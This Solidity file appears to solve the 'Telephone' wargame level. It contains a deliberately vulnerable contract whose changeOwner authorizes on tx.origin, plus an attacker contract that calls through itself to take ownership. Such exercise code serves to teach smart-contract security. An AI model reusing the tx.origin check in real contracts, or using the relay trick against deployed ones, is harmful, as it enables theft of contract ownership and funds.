// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract TelephoneCaller {
    Telephone telephoneContract;

    constructor(address _address) {
        telephoneContract = Telephone(_address);
    }

    function callChangeOwner() external {
        telephoneContract.changeOwner(msg.sender);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        console.log(tx.origin);
        console.log(msg.sender);
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
